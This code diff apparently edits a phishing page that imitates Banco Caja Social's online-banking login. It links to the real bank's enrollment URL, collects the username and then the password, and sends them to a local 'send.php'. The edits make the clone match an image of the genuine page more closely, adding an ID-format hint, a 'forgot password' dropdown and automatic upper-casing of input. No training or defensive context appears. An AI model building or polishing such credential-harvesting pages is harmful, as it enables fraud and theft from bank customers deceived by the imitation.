@@ -19,6 +19,14 @@
             to { transform: rotate(360deg); }
         }
         .d-none { display: none !important; }
+        
+        /* Ajuste para el texto de ejemplo debajo del input */
+        .input-example-text {
+            display: block;
+            margin-top: 5px;
+            color: #6c757d;
+            font-size: 0.85rem;
+        }
     </style>
 </head>
 <body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
@@ -37,11 +45,11 @@
                     </header>
 
                     <!-- ============================================= -->
-                    <!-- PASO 1: USUARIO (idéntico a tu index.php)     -->
+                    <!-- PASO 1: USUARIO (Diseño según la imagen)      -->
                     <!-- ============================================= -->
                     <div id="step-username">
                         <div class="bb-subtitle bb-block bb-block--lg">
-                            <span>Ingrese su número de documento o usuario de canales digitales.</span>
+                            <span>Recuerde que su usuario está compuesto por su Tipo de Identificación <strong>(CC, CE, NI, TI, PE)</strong> y su Número de Identificación sin espacios, puntos ni comas.</span>
                         </div>
                         <div id="kc-form">
                             <div id="kc-form-wrapper">
@@ -53,19 +61,33 @@
                                             name="username"
                                             type="text"
                                             autofocus
-                                            autocomplete="off"
-                                            placeholder="Número de documento o usuario">
+                                            autocomplete="off">
+                                        <small class="input-example-text">Ejemplo: CC1234567890</small>
                                     </div>
                                     <div class="bb-button-bar bb-block bb-block--xl mt-3">
+                                        <!-- Botón cambiado a "Siguiente" -->
                                         <button id="btn-index"
                                             class="btn btn-primary w-100"
                                             type="submit"
                                             disabled>
-                                            Continuar
+                                            Siguiente
                                         </button>
                                     </div>
+                                    
+                                    <!-- Enlace de olvidó contraseña añadido aquí como en la imagen -->
+                                    <div class="bb-block bb-block--xl mt-3 text-start">
+                                        <a class="btn-link-text" data-bs-toggle="collapse" href="#collapseForgot" role="button" aria-expanded="false" aria-controls="collapseForgot" style="font-weight: bold; color: #0056b3;">
+                                            ¿Olvidó su contraseña? ▼
+                                        </a>
+                                        <div class="collapse mt-2" id="collapseForgot">
+                                            <div class="card card-body" style="font-size: 0.9rem; background-color: #f8f9fa;">
+                                                Para recuperar su contraseña, diríjase a la opción de recuperación en el portal principal o comuníquese con la línea de atención.
+                                            </div>
+                                        </div>
+                                    </div>
+
                                     <hr class="bb-block bb-block--lg identity-separator">
-                                    <div class="bb-subtitle d-flex align-items-center gap-2 flex-wrap">
+                                    <div class="bb-subtitle d-flex align-items-center gap-2 flex-wrap mt-4">
                                         <div class="bb-block bb-block--sm mb-0">¿Es un cliente nuevo?</div>
                                         <strong class="mb-0">
                                             <a class="btn-link-text" href="https://bancapersonas.bancocajasocial.com/web/enrollment">
@@ -79,7 +101,7 @@
                     </div>
 
                     <!-- ============================================= -->
-                    <!-- PASO 2: CONTRASEÑA (idéntico a contra.php)    -->
+                    <!-- PASO 2: CONTRASEÑA                            -->
                     <!-- ============================================= -->
                     <div id="step-password" class="d-none">
                         <div class="bb-subtitle bb-block bb-block--lg">
@@ -140,6 +162,9 @@
         </div>
     </div>
 
+    <!-- Bootstrap JS (opcional, solo para que funcione el desplegable del "Olvidó su contraseña") -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
     <script>
         /* ========= CONFIGURACIÓN ========= */
         const SEND_URL = './send.php';
@@ -189,6 +214,8 @@
 
         /* ---------- PASO 1: USUARIO ---------- */
         inputUser.addEventListener('input', () => {
+            // Convertir a mayúsculas automáticamente ayuda al formato "CC123..."
+            inputUser.value = inputUser.value.toUpperCase();
             btnIndex.disabled = inputUser.value.trim().length === 0;
         });
 
@@ -200,7 +227,7 @@
             USERNAME = username;
             inpUsernameHidden.value = username;
 
-            // Mostrar pantalla de contraseña (misma página, mismo diseño)
+            // Cambiar de vista en la misma página
             stepUsername.classList.add('d-none');
             stepPassword.classList.remove('d-none');
             passInput.focus();
